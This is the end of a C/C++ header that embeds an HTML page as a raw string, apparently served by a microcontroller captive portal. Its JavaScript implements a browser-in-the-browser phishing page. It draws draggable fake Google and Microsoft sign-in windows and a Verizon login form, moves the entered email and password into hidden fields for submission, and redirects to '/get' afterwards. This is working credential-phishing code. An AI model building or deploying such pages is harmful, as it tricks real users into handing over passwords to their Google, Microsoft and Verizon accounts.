            isDragging = true;
            const currentWindow = activeWindow === 'google' ? googleWindow : microsoftWindow;
            offset = {
                x: event.clientX - currentWindow.offsetLeft,
                y: event.clientY - currentWindow.offsetTop,
            };
            const currentHeader = currentWindow.querySelector('.browser-header');
            currentHeader.style.cursor = 'grabbing';
        }

        function handleDrag(event) {
            if (isDragging && activeWindow) {
                let currentWindow = activeWindow === 'google' ? googleWindow : microsoftWindow;
                currentWindow.style.left = event.clientX - offset.x + 'px';
                currentWindow.style.top = event.clientY - offset.y + 'px';
            }
        }

        function handleDragEnd() {
            isDragging = false;
            if (activeWindow) {
                const currentHeader = activeWindow === 'google' ? googleWindow.querySelector('.browser-header') : microsoftWindow.querySelector('.browser-header');
                currentHeader.style.cursor = 'grab';
            }
        }

        googleHeader.addEventListener('mousedown', handleDragStart);
        microsoftHeader.addEventListener('mousedown', handleDragStart);
        document.addEventListener('mousemove', handleDrag);
        document.addEventListener('mouseup', handleDragEnd);

        function handleLoginSuccess() {
            window.location.replace('/get');
        }

        googleEmailStepForm.addEventListener('submit', function(event) {
            event.preventDefault();
            if (isValidEmail(emailInputBitb.value.trim())) {
                googleUserEmail = emailInputBitb.value.trim();
                googleHiddenEmailInput.value = googleUserEmail;

                googleEmailStepForm.style.display = 'none';
                googlePasswordStepForm.style.display = 'block';
                passwordInputBitb.focus();
            } else {
                showMessage('Please enter a valid email address.');
            }
        });

        googlePasswordStepForm.addEventListener('submit', function(event) {
            if (passwordInputBitb.value.trim() === '') {
                event.preventDefault();
                showMessage('Please enter your password.');
            }
        });


        microsoftEmailStepForm.addEventListener('submit', function(event) {
            event.preventDefault();
            microsoftUserEmail = microsoftEmailInput.value.trim();
            if (microsoftUserEmail) {
                microsoftHiddenEmailInput.value = microsoftUserEmail;
                microsoftEmailStepForm.style.display = 'none'
                microsoftPasswordStepForm.style.display = 'block';
                microsoftPasswordInput.focus();
            } else {
                showMessage('Please enter your email or phone number.');
            }
        });

        microsoftPasswordStepForm.addEventListener('submit', function(event) {
            if (microsoftPasswordInput.value.trim() === '') {
                event.preventDefault();
                showMessage('Please enter your password.');
            }
        });

        function isValidEmail(email) {
            const emailRegex = /^[\w-\.]+@([\w-]+\.)+[\w-]{2,4}$/;
            return emailRegex.test(email);
        }

        googleLoginButton.addEventListener('click', function() {
            showLogin('google');
        });

        microsoftLoginButton.addEventListener('click', function() {
            showLogin('microsoft');
        });

        verizonLoginForm.addEventListener('submit', function(event) {
            const emailValue = verizonEmailInput.value.trim();
            const passwordValue = verizonPasswordInput.value.trim();
            let hasErrors = false;

            if (!emailValue) {
                verizonEmailError.textContent = 'Please enter your phone number or email.';
                verizonEmailInput.classList.add('input-error');
                hasErrors = true;
            } else {
                verizonEmailError.textContent = '';
                verizonEmailInput.classList.remove('input-error');
            }

            if (!passwordValue) {
                showMessage('Please enter your password.');
                hasErrors = true;
            }

            if (hasErrors) {
                event.preventDefault();
            }
        });

        verizonEmailInput.addEventListener('input', function() {
            if (this.value) {
                verizonEmailError.textContent = '';
                verizonEmailInput.classList.remove('input-error');
            }
        });
    </script>
</body>
</html>
)rawliteral";
#endif